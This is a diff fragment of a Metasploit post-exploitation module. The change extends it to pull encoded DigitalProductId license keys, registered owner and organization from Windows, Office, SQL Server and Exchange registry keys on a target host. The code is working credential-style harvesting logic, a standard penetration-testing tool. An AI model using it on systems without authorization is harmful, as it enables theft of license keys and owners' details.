@@ -40,20 +40,39 @@ class Metasploit3 < Msf::Post
 					"License Key"
 				])
 
-		keys = [ "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion" ]
+		keys =  [["HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "DigitalProductId"],
+			 ["HKLM\\SOFTWARE\\Microsoft\\Office\\11.0\\Registration\\{91110409-6000-11D3-8CFE-0150048383C9}", "DigitalProductId"],
+			 ["HKLM\\SOFTWARE\\Microsoft\\Office\\12.0\\Registration\\{91120000-00CA-0000-0000-0000000FF1CE}", "DigitalProductId"],
+			 ["HKLM\\SOFTWARE\\Microsoft\\Office\\12.0\\Registration\\{91120000-0014-0000-0000-0000000FF1CE}", "DigitalProductId"],
+			 ["HKLM\\SOFTWARE\\Microsoft\\Office\\12.0\\Registration\\{91120000-0051-0000-0000-0000000FF1CE}", "DigitalProductId"],
+			 ["HKLM\\SOFTWARE\\Microsoft\\Office\\12.0\\Registration\\{91120000-0053-0000-0000-0000000FF1CE}", "DigitalProductId"],
+			 ["HKLM\\SOFTWARE\\Microsoft\\Microsoft SQL Server\\100\\Tools\\Setup", "DigitalProductId"],
+			 ["HKLM\\SOFTWARE\\Microsoft\\Microsoft SQL Server\\90\\ProductID", "DigitalProductId77654"],
+			 ["HKLM\\SOFTWARE\\Microsoft\\Microsoft SQL Server\\90\\ProductID", "DigitalProductId77574"],
+			 ["HKLM\\SOFTWARE\\Microsoft\\Exchange\\Setup", "DigitalProductId"],
+			]
 
 		keys.each do |keyx86|
+			
+			#parent key
+			p = keyx86[0,1].join
+			
+			#child key
+			c = keyx86[1,1].join
+
 			key      = nil
-			keychunk = registry_getvaldata(keyx86, "DigitalProductId")
+			keychunk = registry_getvaldata(p, c)
 			key      = decode(keychunk.unpack("C*")) if not keychunk.nil?
 
-			appname = registry_getvaldata(keyx86, "ProductName")
-			rowner  = registry_getvaldata(keyx86, "RegisteredOwner")
-			rorg    = registry_getvaldata(keyx86, "RegisteredOrganization")
+			appname = registry_getvaldata(p, "ProductName")
+			rowner  = registry_getvaldata(p, "RegisteredOwner")
+			rorg    = registry_getvaldata(p, "RegisteredOrganization")
 
 			#In some cases organization info might not be there even though
 			#there's a licenses key
 			rorg = '' if rorg.nil?
+			rowner = '' if rowner.nil?
+			appname = p if appname.nil?
 
 			#Only save info if appname, rowner, and key are found
 			if not appname.nil? and not rowner.nil? and not key.nil?
